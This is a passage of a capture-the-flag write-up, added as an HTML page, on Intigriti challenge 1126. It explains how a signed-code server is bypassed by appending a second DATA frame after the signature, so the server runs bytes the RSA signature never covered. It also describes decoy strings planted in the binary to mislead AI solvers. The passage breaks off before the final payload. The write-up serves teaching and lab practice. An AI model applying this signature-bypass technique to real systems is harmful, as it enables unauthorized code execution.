@@ -1,0 +1,802 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Super Fast Server · Intigriti 1126 write-up</title>
+<meta name="description" content="Write-up of Intigriti's November 2026 challenge: an RSA-2048 signature that covers one region of memory while the server executes another, turning a published example into arbitrary code execution.">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>&#128273;</text></svg>">
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Super Fast Server · Intigriti 1126">
+<meta property="og:description" content="The signature verifies. It just does not cover the bytes that run.">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Super Fast Server · Intigriti 1126">
+<meta name="twitter:description" content="RSA-2048 held. The accounting around it did not.">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans+Condensed:wght@500;600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+
+<style>
+  :root {
+    --paper:#F4F7F9; --surface:#FFFFFF; --surface-2:#E6EDF2;
+    --ink:#0D1723; --ink-2:#36475A; --muted:#67798C; --rule:#D2DDE6;
+    --signal:#0B6E7A; --signal-dim:#DDF0F2; --loss:#A82424; --loss-dim:#FBE4E4;
+    --win:#0E7A4F; --amber:#8F5E09; --on-signal:#FFFFFF; --on-loss:#FFFFFF;
+    --screen:#06121A; --screen-ink:#CFE3EA; --screen-dim:#6C8795;
+    --shadow:0 1px 2px rgba(13,23,35,.05), 0 8px 24px -12px rgba(13,23,35,.22);
+    --measure:72ch;
+    --step--1:clamp(.78rem,.76rem + .1vw,.84rem);
+    --step-0:clamp(1rem,.97rem + .16vw,1.09rem);
+    --step-1:clamp(1.2rem,1.13rem + .34vw,1.42rem);
+    --step-2:clamp(1.5rem,1.36rem + .68vw,2rem);
+    --step-3:clamp(2rem,1.7rem + 1.5vw,3.1rem);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --paper:#060E15; --surface:#0E1C26; --surface-2:#16293A;
+      --ink:#E8F1F5; --ink-2:#B3C7D2; --muted:#7D94A2; --rule:#1F3543;
+      --signal:#22D3EE; --signal-dim:#06303A; --loss:#FF6B6B; --loss-dim:#3A1414;
+      --win:#4ADE80; --amber:#FBBF24; --on-signal:#042A33; --on-loss:#330C0C;
+      --screen:#030A0F; --screen-ink:#CFE3EA; --screen-dim:#6C8795;
+      --shadow:0 1px 2px rgba(0,0,0,.45), 0 10px 30px -14px rgba(0,0,0,.8);
+    }
+  }
+  :root[data-theme="dark"] {
+    --paper:#060E15; --surface:#0E1C26; --surface-2:#16293A;
+    --ink:#E8F1F5; --ink-2:#B3C7D2; --muted:#7D94A2; --rule:#1F3543;
+    --signal:#22D3EE; --signal-dim:#06303A; --loss:#FF6B6B; --loss-dim:#3A1414;
+    --win:#4ADE80; --amber:#FBBF24; --on-signal:#042A33; --on-loss:#330C0C;
+    --screen:#030A0F; --screen-ink:#CFE3EA; --screen-dim:#6C8795;
+    --shadow:0 1px 2px rgba(0,0,0,.45), 0 10px 30px -14px rgba(0,0,0,.8);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin:0; background:var(--paper); color:var(--ink);
+    font-family:"IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
+    font-size:var(--step-0); line-height:1.65; -webkit-font-smoothing:antialiased;
+  }
+  .wrap { max-width:var(--measure); margin-inline:auto; padding:0 1.4rem; }
+  h1,h2,h3,h4 { font-family:"IBM Plex Sans Condensed","IBM Plex Sans",sans-serif; text-wrap:balance; line-height:1.14; margin:0; }
+  a { color:var(--signal); text-underline-offset:3px; }
+  a:focus-visible { outline:2px solid var(--signal); outline-offset:3px; border-radius:3px; }
+  code, pre, .osd, .tag { font-family:"IBM Plex Mono", ui-monospace, monospace; }
+
+  .mast { border-bottom:1px solid var(--rule); padding:clamp(3rem,9vw,5.5rem) 0 2.4rem; }
+  .eyebrow {
+    font-family:"IBM Plex Mono",monospace; font-size:var(--step--1); letter-spacing:.16em;
+    text-transform:uppercase; color:var(--muted); display:flex; flex-wrap:wrap; gap:.5rem 1rem; align-items:center;
+  }
+  .eyebrow .dot { width:7px;height:7px;border-radius:50%;background:var(--signal);flex:none; }
+  h1 { font-size:var(--step-3); font-weight:700; letter-spacing:-.02em; margin:1rem 0 .8rem; }
+  .standfirst { font-size:var(--step-1); color:var(--ink-2); max-width:56ch; margin:0 0 1.6rem; }
+
+  .pricetags { display:flex; flex-wrap:wrap; gap:.8rem; margin:1.6rem 0 0; }
+  .ptag {
+    background:var(--surface); border:1px solid var(--rule); border-radius:10px;
+    padding:.7rem 1rem; min-width:11rem; flex:1 1 11rem;
+  }
+  .ptag b { display:block; font-family:"IBM Plex Mono",monospace; font-size:.64rem; letter-spacing:.16em;
+    text-transform:uppercase; color:var(--muted); font-weight:500; }
+  .ptag span { font-family:"IBM Plex Mono",monospace; font-size:1.5rem; font-weight:600; }
+  .ptag.cost span { color:var(--ink); }
+  .ptag.have span { color:var(--amber); }
+  .ptag.paid span { color:var(--win); }
+
+  .striplink {
+    margin-top:1.6rem;
+    background:#0E1C26; border:1px solid #04090d; border-radius:8px;
+    padding:.6rem .9rem; text-align:center;
+    font-family:"IBM Plex Mono",monospace; font-size:.68rem;
+    letter-spacing:.16em; text-transform:uppercase; color:#7D94A2;
+  }
+  .striplink a { color:#BBD4DD; text-decoration:none; }
+  .striplink a::before { content:"\203A "; color:var(--signal); }
+  .striplink a:hover { color:var(--signal); }
+
+  section { padding:3.2rem 0 0; }
+  .ch {
+    display:flex; align-items:baseline; gap:.8rem; font-family:"IBM Plex Mono",monospace;
+    font-size:.72rem; letter-spacing:.18em; text-transform:uppercase; color:var(--muted); margin-bottom:.7rem;
+  }
+  .ch::after { content:""; flex:1; height:1px; background:var(--rule); }
+  h2 { font-size:var(--step-2); font-weight:600; letter-spacing:-.015em; margin-bottom:.9rem; }
+  h4 {
+    font-family:"IBM Plex Mono",monospace; font-size:.74rem; letter-spacing:.13em; text-transform:uppercase;
+    color:var(--signal); margin:1.8rem 0 .5rem; font-weight:600;
+  }
+  p { margin:0 0 1.05rem; }
+  ul { margin:0 0 1.05rem; padding-left:1.2rem; }
+  li { margin-bottom:.4rem; }
+  strong { font-weight:600; }
+  p code, li code, td code, figcaption code { background:var(--surface-2); padding:.1em .36em; border-radius:3px; font-size:.87em; word-break:break-word; }
+
+  figure { margin:1.5rem 0; }
+  .screen { position:relative; background:var(--screen); border-radius:5px; border:1px solid #000; overflow:hidden; box-shadow:var(--shadow); }
+  .screen-bar {
+    display:flex; justify-content:space-between; align-items:center; gap:1rem; padding:.5rem .85rem;
+    border-bottom:1px solid rgba(255,255,255,.09); font-family:"IBM Plex Mono",monospace;
+    font-size:.68rem; letter-spacing:.13em; text-transform:uppercase; color:var(--screen-dim);
+  }
+  .screen pre { margin:0; padding:.95rem .85rem; overflow-x:auto; color:var(--screen-ink); font-size:.8rem; line-height:1.65; }
+  .k { color:#4FD1E0; } .s { color:#9FE8B4; } .c { color:var(--screen-dim); font-style:italic; } .bad { color:#FF6B6B; } .ok { color:#4ADE80; } .w { color:#FBBF24; }
+  figcaption { font-size:var(--step--1); color:var(--muted); margin-top:.55rem; }
+
+  .note { border:1px solid var(--rule); border-left:3px solid var(--loss); background:var(--surface); border-radius:3px; padding:1rem 1.1rem; margin:1.5rem 0; }
+  .note.good { border-left-color:var(--win); }
+  .note p:last-child { margin-bottom:0; }
+  .note .lab { font-family:"IBM Plex Mono",monospace; font-size:.68rem; letter-spacing:.15em; text-transform:uppercase; color:var(--loss); display:block; margin-bottom:.35rem; }
+  .note.good .lab { color:var(--win); }
+
+  .tw { overflow-x:auto; margin:1.5rem 0; border:1px solid var(--rule); border-radius:4px; }
+  table { border-collapse:collapse; width:100%; font-size:var(--step--1); min-width:460px; }
+  th, td { text-align:left; padding:.62rem .85rem; border-bottom:1px solid var(--rule); vertical-align:top; }
+  th { font-family:"IBM Plex Mono",monospace; font-size:.68rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); background:var(--surface-2); font-weight:500; }
+  tbody tr:last-child td { border-bottom:0; }
+  td:first-child { font-weight:500; }
+  .tag { display:inline-block; font-size:.66rem; letter-spacing:.1em; text-transform:uppercase; padding:.18em .5em; border-radius:3px; white-space:nowrap; }
+  .tag.no { background:var(--loss-dim); color:var(--loss); }
+  .tag.yes { background:var(--signal-dim); color:var(--signal); }
+
+  /* ---------- the accumulator map ---------- */
+  .mapwrap { overflow-x:auto; margin:1.6rem 0 .4rem; }
+  .memmap { min-width:540px; display:grid; grid-template-columns:396fr 424fr 256fr 424fr; gap:.3rem 3px; }
+  .memmap .blk {
+    border-radius:4px; padding:.55rem .5rem; text-align:center; min-width:0;
+    font-family:"IBM Plex Mono",monospace; border:1px solid var(--rule); background:var(--surface);
+  }
+  .memmap .blk b { display:block; font-size:.74rem; font-weight:600; letter-spacing:.06em; color:var(--ink); }
+  .memmap .blk span { display:block; font-size:.62rem; color:var(--muted); margin-top:.15rem; }
+  .memmap .blk.code { border-color:var(--signal); background:var(--signal-dim); }
+  .memmap .blk.sig  { border-color:var(--amber); }
+  .memmap .blk.evil { border-color:var(--loss); background:var(--loss-dim); }
+  .memmap .blk.evil b { color:var(--loss); }
+
+  .memmap .band { border-radius:3px; padding:.3rem .5rem; font-family:"IBM Plex Mono",monospace;
+    font-size:.62rem; letter-spacing:.1em; text-transform:uppercase; text-align:center; min-width:0;
+    overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .memmap .band.hash { background:var(--signal); color:var(--on-signal); }
+  .memmap .band.gap  { color:var(--muted); }
+  .memmap .band.exec { background:var(--loss); color:var(--on-loss); }
+  .memmap .band.void { }
+  .memmap .tick { font-family:"IBM Plex Mono",monospace; font-size:.6rem; color:var(--muted); text-align:left; min-width:0; }
+  .memmap .tick::before { content:"\251D"; margin-right:.25em; opacity:.55; }
+
+  .frames { margin:1.6rem 0; display:grid; gap:.5rem; }
+  .frm {
+    display:grid; grid-template-columns:1.8rem 5.2rem 1fr auto; gap:.8rem; align-items:center;
+    background:var(--surface); border:1px solid var(--rule); border-left:3px solid var(--rule);
+    border-radius:4px; padding:.58rem .85rem; font-size:var(--step--1);
+  }
+  @media (max-width:560px) { .frm { grid-template-columns:1.6rem 4.6rem 1fr; } .frm .off { grid-column:2 / -1; } }
+  .frm.hit  { border-left-color:var(--signal); }
+  .frm.swap { border-left-color:var(--loss); }
+  .frm .n { font-family:"IBM Plex Mono",monospace; font-size:.72rem; color:var(--muted); }
+  .frm .cmd { font-family:"IBM Plex Mono",monospace; font-weight:600; }
+  .frm.swap .cmd { color:var(--loss); }
+  .frm .what { color:var(--ink-2); min-width:0; }
+  .frm .off { font-family:"IBM Plex Mono",monospace; color:var(--muted); font-variant-numeric:tabular-nums; white-space:nowrap; }
+
+  .wire { display:grid; grid-template-columns:1fr 1fr; gap:.7rem; margin:1.5rem 0; }
+  @media (max-width:680px) { .wire { grid-template-columns:1fr; } }
+  .wire .pane { background:var(--screen); border:1px solid var(--rule); border-radius:6px; overflow:hidden; box-shadow:var(--shadow); min-width:0; }
+  .wire .pane-bar {
+    display:flex; justify-content:space-between; align-items:center; gap:.6rem;
+    padding:.45rem .7rem; border-bottom:1px solid rgba(255,255,255,.08);
+    background:rgba(255,255,255,.035); font-family:"IBM Plex Mono",monospace;
+    font-size:.6rem; letter-spacing:.16em; text-transform:uppercase; color:var(--screen-dim);
+  }
+  .wire .pane-bar b { color:#DCEEF4; font-weight:600; }
+  .wire pre { margin:0; padding:.75rem .7rem; font-size:.69rem; line-height:1.62; overflow-x:auto; color:#9FB8C4; }
+  .wire .hl { color:var(--signal); font-weight:600; }
+
+  .reveal { margin:3.2rem 0 0; }
+  .vault {
+    position:relative; background:#02080C; border-radius:10px; padding:clamp(2rem,7vw,3.4rem) 1.2rem;
+    text-align:center; overflow:hidden; border:1px solid #000; box-shadow:inset 0 0 90px rgba(0,0,0,.9), var(--shadow);
+  }
+  .vault::before { content:""; position:absolute; inset:0; background:radial-gradient(ellipse at center, rgba(34,211,238,.14), transparent 62%); }
+  .vault .osd { position:relative; font-size:.78rem; letter-spacing:.34em; color:#7FA3B2; margin-bottom:1.1rem; }
+  .vault .flag { position:relative; font-family:"IBM Plex Mono",monospace; font-weight:500; font-size:clamp(.72rem,2.5vw,1.06rem); color:#EFF8FB; word-break:break-all; text-shadow:0 0 16px rgba(80,210,235,.45); }
+  .vault.warming .osd, .vault.warming .flag { opacity:0; }
+  .vault.lit .osd, .vault.lit .flag { opacity:1; }
+  .vault.lit .osd  { animation:fadein .5s ease-out .15s both; }
+  .vault.lit .flag { animation:fadein .6s ease-out .4s both; }
+  @keyframes fadein { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:none; } }
+  @media (prefers-reduced-motion: reduce) {
+    .vault.warming .osd, .vault.warming .flag { opacity:1; }
+    .vault.lit .osd, .vault.lit .flag { animation:none; }
+  }
+  .caret { display:inline-block; width:.55em; height:1.05em; background:#EFF8FB; vertical-align:-.16em; margin-left:.22em; animation:blink 1.15s steps(1) infinite; }
+  @keyframes blink { 50% { opacity:0; } }
+  @media (prefers-reduced-motion: reduce) { .caret { animation:none; } }
+
+  .wrap > section:last-of-type { padding-bottom:4rem; }
+
+  .signoff { margin:3.2rem 0 4.5rem; text-align:center; }
+  .signoff .bars { display:flex; height:22px; border-radius:3px; overflow:hidden; margin-bottom:1.5rem; }
+  .signoff .bars i { flex:1; }
+  .signoff .eot {
+    font-family:"IBM Plex Mono",monospace; font-size:.72rem; letter-spacing:.32em;
+    text-transform:uppercase; color:var(--muted); margin-bottom:.9rem;
+  }
+  .signoff .who {
+    font-family:"IBM Plex Sans Condensed","IBM Plex Sans",sans-serif;
+    font-size:var(--step-1); font-weight:600; color:var(--ink); margin-bottom:.35rem;
+  }
+  .signoff .who a { color:var(--signal); text-decoration:none; }
+
+  .themebtn {
+    position:fixed; top:1rem; right:1rem; z-index:20; font-family:"IBM Plex Mono",monospace;
+    font-size:.68rem; letter-spacing:.12em; text-transform:uppercase; background:var(--surface);
+    color:var(--muted); border:1px solid var(--rule); border-radius:999px; padding:.45rem .8rem; cursor:pointer; line-height:1;
+  }
+  .themebtn:hover { color:var(--ink); border-color:var(--muted); }
+  .themebtn:focus-visible { outline:2px solid var(--signal); outline-offset:3px; }
+  @media print { .themebtn { display:none; } }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <header class="mast">
+    <div class="eyebrow">
+      <span class="dot" aria-hidden="true"></span>
+      <span>Intigriti &middot; November 2026 &middot; Challenge 1126</span>
+    </div>
+    <h1>The signature that covered the wrong bytes</h1>
+    <p class="standfirst">A web server that will only run RSA&#8209;2048 signed code, and publishes a
+      working signed example in its own help text. The signature is fine. It just does not cover the
+      bytes that actually run.</p>
+
+    <div class="pricetags">
+      <div class="ptag cost"><b>Bytes signed</b><span>820</span></div>
+      <div class="ptag have"><b>Bytes executed at</b><span>+1076</span></div>
+      <div class="ptag paid"><b>Requests needed</b><span>1</span></div>
+    </div>
+
+    <div class="striplink">
+      <a href="https://challenge-1126.challenges.intigriti.io/login.html" target="_blank"
+         rel="noopener noreferrer">challenge&#8209;1126.challenges.intigriti.io</a>
+    </div>
+  </header>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 01 &middot; The manual</div>
+    <h2>The documentation tells you how to break it</h2>
+
+    <p>The challenge opens on a login form that does nothing. The only two live links on it go to a
+      changelog and, from there, to a documentation page. That changelog is the target list:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Version</th><th>Entry</th></tr></thead>
+        <tbody>
+          <tr><td>2.0.1</td><td>Added signups &middot; added POST request parsing &middot; improved docs on deployment and <b>what files the server can serve</b></td></tr>
+          <tr><td>2.0.0</td><td><b>Fixed a path traversal</b> &middot; added a <b>custom protocol, protected by a very good secret, to allow execution of RSA&#8209;2048 signed code</b> &middot; improved HTTP 1.0</td></tr>
+          <tr><td>1.0.0</td><td>Initial public release</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>And the documentation page, under <em>How should the server run?</em>, hands over the first
+      move without being asked:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>/documentation.html</span><span>do's and don'ts</span></div>
+<pre><span class="c">The server serves files from the PWD.</span>
+<span class="c">You should run it with a full path and the PWD set to the files you are ready to serve.</span>
+
+<span class="ok">DO</span>     Run the server binary as a service
+<span class="ok">DO</span>     Restart the service if it crashes
+<span class="bad">DON'T</span>  Run the server binary in the PWD</pre>
+      </div>
+      <figcaption>Three rules. The deployment breaks the third one.</figcaption>
+    </figure>
+
+    <p>If the binary lives in the directory it serves, then the binary is a file it will serve:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>GET /superfastserver</span><span>200 OK</span></div>
+<pre>$ curl -sO https://challenge-1126.challenges.intigriti.io/superfastserver
+$ file superfastserver
+superfastserver: <span class="k">ELF 64-bit LSB pie executable</span>, x86-64, dynamically linked, <span class="w">stripped</span>
+$ md5sum superfastserver
+<span class="s">836b0383be83c8be10de03b5d0afec63</span>  superfastserver   <span class="c">// 47,880 bytes</span></pre>
+      </div>
+      <figcaption>Everything below this point came out of that file. The "very good secret", the RSA
+        modulus, the protocol, and the path the flag is read from.</figcaption>
+    </figure>
+
+    <div class="note good">
+      <span class="lab">Worth saying out loud</span>
+      <p>The path traversal really is fixed. File reads take <code>basename()</code> of the request
+        path, so a slash cannot survive &mdash; <code>/a/b/c/index.html</code> serves
+        <code>index.html</code> from the working directory and <code>/../the_real.flag</code> is a
+        flat 404. I burned twelve encodings on it before accepting that 2.0.0 did its job.</p>
+    </div>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 02 &middot; The second door</div>
+    <h2>Two listeners, and the one you cannot reach is the interesting one</h2>
+
+    <p>Two format strings in the binary give away the shape of the thing:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>.rodata</span><span>strings</span></div>
+<pre>[%lu] <span class="k">HTTP server</span> listening on port %u              <span class="c">// 8080, published</span>
+[%lu] <span class="k">custom protocol server</span> listening on port %u   <span class="c">// 5001, loopback only</span></pre>
+      </div>
+    </figure>
+
+    <p>Only 8080 is exposed. But the HTTP handler has exactly one route that is not a file lookup,
+      and it is a bridge:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>POST /custom_protocol &middot; handler at 0x7388</span><span>decompiled</span></div>
+<pre>body = strstr(request, <span class="s">"\r\n\r\n"</span>) + 4;
+len  = total_read - (body - request);
+
+fd = socket(AF_INET, SOCK_STREAM, 0);
+connect(fd, <span class="s">"127.0.0.1"</span>:<span class="k">5001</span>);
+send(fd, body, len, 0);          <span class="c">// your raw bytes, untouched</span>
+sleep(2);
+read(fd, out, 0x2000);           <span class="c">// one read, returned to you verbatim</span></pre>
+      </div>
+      <figcaption>A loopback-only service that would pass a network review, proxied straight to the
+        internet. The <code>x&#8209;envoy&#8209;upstream&#8209;service&#8209;time: 2002</code> on every reply is
+        that <code>sleep(2)</code>.</figcaption>
+    </figure>
+
+    <p>So the whole protocol is reachable in one POST, and the reply comes back in the response body.
+      No tunnel, no callback, no second channel.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 03 &middot; The wire</div>
+    <h2>A secret that cannot be brute forced, and does not need to be</h2>
+
+    <p>The connection thread starts by reading exactly 106 bytes and comparing them against a string
+      sitting in <code>.rodata</code>:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>.rodata @ 0x9660</span><span>106 bytes</span></div>
+<pre><span class="s">SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033</span></pre>
+      </div>
+      <figcaption>Entirely true, and entirely beside the point. It ships inside a file the server
+        hands out to anyone who asks.</figcaption>
+    </figure>
+
+    <p>Past that, it loops over fixed frames:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Field</th><th>Size</th><th>Rule</th></tr></thead>
+        <tbody>
+          <tr><td>magic</td><td>1</td><td>must be <code>0x77</code> (<code>w</code>), else <code>NAKH</code></td></tr>
+          <tr><td>length</td><td>4</td><td>little-endian, must be <code>&le; 0x400</code>, else <code>NAKL</code></td></tr>
+          <tr><td>command</td><td>4</td><td>ASCII: <code>1337 DATA EXEC CODE PING SIGN HELP</code></td></tr>
+          <tr><td>payload</td><td>length</td><td>must arrive in full, else <code>NAKP</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>Each payload is appended to a <strong>0x2000-byte accumulator</strong> at the current offset,
+      and the offset then advances. Three of the commands do nothing but write down where their
+      payload landed:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Command</th><th>What it records</th><th>Side effect</th></tr></thead>
+        <tbody>
+          <tr><td><code>CODE</code></td><td><code>code_off</code>, <code>code_len</code></td><td><code>mmap(0x400, RW)</code>, copy, <code>mprotect(RX)</code></td></tr>
+          <tr><td><code>DATA</code></td><td><code>data_off</code>, <code>data_len</code></td><td>none</td></tr>
+          <tr><td><code>SIGN</code></td><td><code>sig_off</code>, <code>sig_len</code></td><td>none</td></tr>
+          <tr><td><code>EXEC</code></td><td>&mdash;</td><td>verify, then jump</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>Hold on to that middle row. <code>DATA</code> is last-write-wins, and nothing resets it.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 04 &middot; The gift</div>
+    <h2>-HELP ships a working signature</h2>
+
+    <p><code>HELP</code> does not return prose. It returns 1112 bytes that are a complete, already
+      signed example stream:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Frame</th><th>Payload</th><th>What it is</th></tr></thead>
+        <tbody>
+          <tr><td><code>CODE</code></td><td>396 B</td><td>x86-64 shellcode: a brainfuck interpreter</td></tr>
+          <tr><td><code>DATA</code></td><td>424 B</td><td>a brainfuck program</td></tr>
+          <tr><td><code>SIGN</code></td><td>256 B</td><td>a valid RSA&#8209;2048 signature over <code>SHA&#8209;256(code&nbsp;||&nbsp;data)</code></td></tr>
+          <tr><td><code>EXEC</code></td><td>0 B</td><td>&mdash;</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>There is one trap in replaying it. The length field in the help blob counts the four command
+      bytes; the server's does not. Send it back byte for byte and the framing desyncs immediately:</p>
+
+    <div class="wire">
+      <div class="pane">
+        <div class="pane-bar"><span>replayed verbatim</span><b>wrong</b></div>
+<pre>ACK NAKH NAKH NAKH NAKH NAKH
+NAKH NAKH NAKH NAKH NAKH NAKH
+NAKH NAKH NAKH NAKH NAKH ...</pre>
+      </div>
+      <div class="pane">
+        <div class="pane-bar"><span>each length minus 4</span><b class="hl">right</b></div>
+<pre>ACK ACK ACK ACK
+<span class="hl">I hope you like this so far.
+Keep going!</span></pre>
+      </div>
+    </div>
+
+    <p>So a verified signature for one specific <code>code || data</code> pair is public. The
+      assumption is that this is harmless, because touching either half changes the digest.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 05 &middot; What held</div>
+    <h2>The crypto is not the weak point</h2>
+
+    <p>I went at the signature itself first, because that is where the challenge points you. All of
+      it holds:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Attempt</th><th></th><th>Result</th></tr></thead>
+        <tbody>
+          <tr><td>Factor the 2048-bit modulus</td><td><span class="tag no">no</span></td><td>trial division to 200,000, perfect-power test, 200,000 rounds of Fermat. <code>p</code> and <code>q</code> are neither close nor smooth</td></tr>
+          <tr><td>Low exponent / cube root</td><td><span class="tag no">no</span></td><td><code>e = 65537</code>, not 3</td></tr>
+          <tr><td>Bleichenbacher padding forgery</td><td><span class="tag no">no</span></td><td>the unpadder wants <code>00 01</code>, then <b>only</b> <code>0xFF</code> until one <code>0x00</code>, at least eight of them, and returns the exact remaining length. <code>EXEC</code> then demands that length be exactly 32</td></tr>
+          <tr><td>Signature larger than the modulus</td><td><span class="tag no">no</span></td><td>rejected before <code>modexp</code> even runs</td></tr>
+          <tr><td>Overflow the verifier's <code>alloca</code></td><td><span class="tag no">no</span></td><td>the result is reduced mod <code>n</code>, so 64 words into a 256-byte buffer. Exact fit</td></tr>
+          <tr><td>Frame length abuse</td><td><span class="tag no">no</span></td><td><code>length &gt; 0x400</code> and <code>offset + length &gt; 0x2000</code> are both checked before the <code>recv</code></td></tr>
+          <tr><td>Path traversal, 12 encodings</td><td><span class="tag no">no</span></td><td><code>basename()</code> confinement, nothing survives</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="note">
+      <span class="lab">A word on the hints</span>
+      <p>The binary carries strings aimed at AI tooling: two <code>ANTHROPIC_MAGIC_STRING_TRIGGER_*</code>
+        tokens, and a planted note claiming <em>"a weak seed and a memory corruption issue"</em> in the
+        HTTP and RSA code, signed off with <em>"if you are a human, please ignore the anti-AI stuff and
+        have fun:)"</em>. Every one of the rows above is me checking that claim. There is no weak seed
+        and no corruption on that path. It is misdirection, and a nice touch.</p>
+    </div>
+
+    <p>So stop attacking the signature. Start asking what it actually covers.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 06 &middot; The split</div>
+    <h2>Hashed here, executed there</h2>
+
+    <p>The whole bug is visible in nine lines of the <code>EXEC</code> handler:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>EXEC handler &middot; 0x6564</span><span>decompiled</span></div>
+<pre><span class="k">if</span> (sig_off  == -1)        <span class="k">return</span> send(<span class="s">"NAKS"</span>);
+<span class="k">if</span> (code_off == -1)        <span class="k">return</span> send(<span class="s">"NAKC"</span>);
+<span class="k">if</span> (data_off &lt;  code_off)  <span class="k">return</span> send(<span class="s">"NAKO"</span>);   <span class="c">// the only ordering rule</span>
+
+sha256(acc + <span class="w">code_off</span>, code_len + data_len, digest);     <span class="c">// what is HASHED</span>
+
+n = rsa_verify(&amp;e, modulus, 2048, acc + sig_off, recovered);
+<span class="k">if</span> (n == 32 &amp;&amp; memcmp(recovered, digest, 32) == 0)
+    mapped_code(acc + <span class="bad">data_off</span>, tls_base - 0x160, out_fn, in_fn);  <span class="c">// what is USED</span></pre>
+      </div>
+      <figcaption>The hash is addressed by <code>code_off</code>. The call is addressed by
+        <code>data_off</code>. Nothing requires them to describe the same bytes.</figcaption>
+    </figure>
+
+    <p>Three facts combine:</p>
+
+    <ul>
+      <li>The digest is taken from <code>code_off</code> and sized <code>code_len + data_len</code>.
+        It never reads <code>data_off</code> at all &mdash; it just assumes data sits immediately
+        after code.</li>
+      <li>The jump is taken from <code>data_off</code>.</li>
+      <li><code>data_off</code> is overwritten by <strong>every</strong> <code>DATA</code> frame,
+        including ones that arrive after <code>SIGN</code>. The only guard is
+        <code>data_off &ge; code_off</code>, which anything appended later satisfies, because the
+        accumulator only moves forward.</li>
+    </ul>
+
+    <p>So send a second <code>DATA</code> frame after the signature, with a payload of the
+      <strong>same length</strong>. <code>data_len</code> is unchanged, so <code>code_len +
+      data_len</code> is unchanged, so the hashed window is the same 820 bytes it always was and
+      still holds the original code and data. Same digest. Same signature. Different pointer.</p>
+
+    <div class="mapwrap">
+      <div class="memmap">
+        <div class="blk code" style="grid-row:1;grid-column:1"><b>CODE</b><span>396 B</span></div>
+        <div class="blk"      style="grid-row:1;grid-column:2"><b>DATA</b><span>424 B</span></div>
+        <div class="blk sig"  style="grid-row:1;grid-column:3"><b>SIGN</b><span>256 B</span></div>
+        <div class="blk evil" style="grid-row:1;grid-column:4"><b>DATA&prime;</b><span>424 B</span></div>
+
+        <div class="band hash" style="grid-row:2;grid-column:1 / 3">signed &mdash; 820 bytes</div>
+        <div class="band exec" style="grid-row:3;grid-column:4">executed</div>
+
+        <span class="tick" style="grid-row:4;grid-column:1">0</span>
+        <span class="tick" style="grid-row:4;grid-column:2">396</span>
+        <span class="tick" style="grid-row:4;grid-column:3">820</span>
+        <span class="tick" style="grid-row:4;grid-column:4">1076</span>
+      </div>
+    </div>
+    <p style="font-size:var(--step--1);color:var(--muted);margin-top:0">The upper band is what the
+      signature vouches for. The lower band is what the CPU is handed. They never overlap.</p>
+
+    <div class="note">
+      <span class="lab">Root cause</span>
+      <p>A time-of-check / time-of-use split. The check reads one address, the use reads another,
+        and the attacker owns the gap between them. No memory corruption is involved at any point
+        &mdash; every bounds check in this binary passes.</p>
+    </div>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 07 &middot; The tape</div>
+    <h2>The interpreter is standing on the flag</h2>
+
+    <p>The signed <code>CODE</code> blob is a brainfuck interpreter, which means my payload has to be
+      a brainfuck program. Eight instructions. That turns out to be plenty, because of where the
+      server puts the secret.</p>
+
+    <p>Before a connection reads its first frame, the thread does this:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>connection thread prologue &middot; 0x5cb0</span><span>decompiled</span></div>
+<pre>f = fopen(<span class="s">"/the_real.flag"</span>, <span class="s">"rb"</span>);
+fread(buf, 1, <span class="k">0x51</span>, f);        <span class="c">// 81 bytes</span>
+fclose(f);
+<span class="c">// copied into thread-local storage at fs:-0x60</span></pre>
+      </div>
+    </figure>
+
+    <p>And <code>EXEC</code> hands the interpreter its tape base in <code>rsi</code>:</p>
+
